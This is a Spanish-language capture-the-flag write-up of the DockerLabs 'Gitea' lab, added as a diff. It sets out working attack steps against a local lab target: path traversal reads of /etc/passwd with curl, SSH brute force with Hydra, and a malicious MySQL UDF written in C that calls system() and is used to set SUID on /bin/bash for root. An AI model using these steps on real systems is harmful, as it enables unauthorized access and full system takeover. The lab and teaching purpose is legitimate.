@@ -1,0 +1,282 @@
+---
+title: Gitea
+description: Resolución completa de la máquina virtual *Gitea* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Gitea**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone una instancia de Gitea con repositorios públicos que contienen credenciales de MySQL y documentación sobre una vulnerabilidad de **path traversal**. Esta vulnerabilidad permite leer archivos del sistema, incluyendo un archivo con múltiples contraseñas que, tras un ataque de fuerza bruta con Hydra, otorga acceso SSH como `designer`.
+Una vez dentro, se descubre que MySQL se ejecuta como `root`. Se crea una **User-Defined Function (UDF)** maliciosa para ejecutar comandos del sistema, permitiendo establecer el bit SUID en `/bin/bash` y obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Gitea',
+    Autor: 'd1se0',
+    Dificultad: 'Media',
+    Fecha: '17/10/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Gitea.zip
+sudo bash auto_deploy.sh Gitea.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Gitea/{content,exploits,nmap,scripts}
+cd Gitea
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+* **3000/tcp** — HTTP (Gitea)
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1766120522/Ports_epaeuh.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80,3000 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web (puerto 80)
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 -d 0 \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,txt,html,js,bak,old \
+  -t 40 -C 404,403
+```
+
+![Feroxbuster 80](https://res.cloudinary.com/dewqswzke/image/upload/v1766120517/Feroxbuster80_pxqhhs.png)
+
+La página principal es básica y no contiene información relevante:
+
+![Index 80](https://res.cloudinary.com/dewqswzke/image/upload/v1766120518/Index80_uyblsg.png)
+
+---
+
+### 1.4 Enumeración Gitea (puerto 3000)
+
+Se accede al servicio Gitea:
+
+![Gitea](https://res.cloudinary.com/dewqswzke/image/upload/v1766120518/Index80_uyblsg.png)
+
+**Hallazgos:**
+- Tres repositorios públicos en `/explore/repos`.
+- Un repositorio contiene credenciales de MySQL: `admin:PASSWORD`.
+  ![MySQL Info](https://res.cloudinary.com/dewqswzke/image/upload/v1766120518/MysqlInfo_kyzbn8.png)
+- Otro repositorio documenta una vulnerabilidad de path traversal en `/download`.
+  ![Vuln TP](https://res.cloudinary.com/dewqswzke/image/upload/v1766120524/VulnTP_u4u8qu.png)
+- En el código fuente del login se encuentra una pista sobre dominios.
+  ![Pista Login](https://res.cloudinary.com/dewqswzke/image/upload/v1766120521/PistaInLogin_l0ora1.png)
+
+Se agregan dominios al `/etc/hosts`:
+
+```bash
+echo "172.17.0.2 admin.s3cr3tdir.dev.gitea.dl" | sudo tee -a /etc/hosts
+echo "172.17.0.2 gitea.dl" | sudo tee -a /etc/hosts
+```
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Path traversal
+
+Se prueba la vulnerabilidad de path traversal:
+
+```bash
+curl -s 'http://gitea.dl/download?filename=/etc/passwd'
+```
+
+![Passwd TP](https://res.cloudinary.com/dewqswzke/image/upload/v1766120519/PasswdTP_ghmcah.png)
+
+Se identifica al usuario `designer`. Se lee `/opt/info.txt`:
+
+```bash
+curl -s "http://gitea.dl/download?filename=/opt/info.txt"
+```
+
+### 2.2 Fuerza bruta SSH
+
+Se extraen posibles contraseñas de `/opt/info.txt`:
+
+```bash
+curl -s 'http://gitea.dl/download?filename=/opt/info.txt' | \
+awk -F '[: -]' '{print $2}' | \
+grep -v '^$' | sort -u > passwords.txt
+```
+
+Se utiliza Hydra:
+
+```bash
+hydra -l designer -P passwords.txt ssh://172.17.0.2 -I -t 64 -f
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1766120518/Hydra_ru7xen.png)
+
+Se obtienen credenciales: `designer:g3n3ralP@ssw0rd`
+
+### 2.3 Acceso SSH
+
+```bash
+ssh designer@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1766120522/SSH_hdaoq8.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De designer → root
+
+MySQL se ejecuta como root:
+
+```bash
+ps aux | grep mysql
+```
+
+Se verifica acceso con las credenciales del repositorio:
+
+```bash
+mysql -u admin -pPASSWORD -e "SELECT USER(), CURRENT_USER();"
+```
+
+Se crea una UDF maliciosa en C:
+
+**udf_shell.c:**
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <mysql.h>
+
+my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
+    if (args->arg_count != 1) {
+        strcpy(message, "sys_exec() requiere un argumento");
+        return 1;
+    }
+    args->arg_type[0] = STRING_RESULT;
+    return 0;
+}
+
+char *sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *result, 
+               unsigned long *length, char *is_null, char *error) {
+    if (args->args[0]) {
+        system(args->args[0]);
+    }
+    *is_null = 0;
+    return NULL;
+}
+```
+
+Se compila y se copia al directorio de plugins de MySQL:
+
+```bash
+gcc -fPIC -shared -o udf_shell.so udf_shell.c $(mysql_config --cflags) $(mysql_config --libs)
+cp udf_shell.so /usr/lib/mysql/plugin/
+```
+
+Se crea la función en MySQL:
+
+```bash
+mysql -u admin -pPASSWORD << 'EOF'
+DROP FUNCTION IF EXISTS sys_exec;
+CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf_shell.so';
+EOF
+```
+
+Se ejecuta un comando para establecer el bit SUID en `/bin/bash`:
+
+```bash
+mysql -u admin -pPASSWORD -e "SELECT sys_exec('chmod u+s /bin/bash');"
+```
+
+Se obtiene una shell privilegiada:
+
+```bash
+/bin/bash -p
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1766120522/Root_g4jb5h.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Path traversal en endpoint /download",
+      severity: "Crítica",
+      impact: "Lectura arbitraria de archivos del sistema"
+    },
+    {
+      vulnerability: "Credenciales expuestas en repositorios públicos",
+      severity: "Alta",
+      impact: "Compromiso de servicios de base de datos"
+    },
+    {
+      vulnerability: "MySQL ejecutándose como root",
+      severity: "Crítica",
+      impact: "Ejecución de comandos como root mediante UDF"
+    },
+    {
+      vulnerability: "User-Defined Functions sin restricciones",
+      severity: "Crítica",
+      impact: "Ejecución de código arbitrario como root"
+    }
+  ]}
+/>
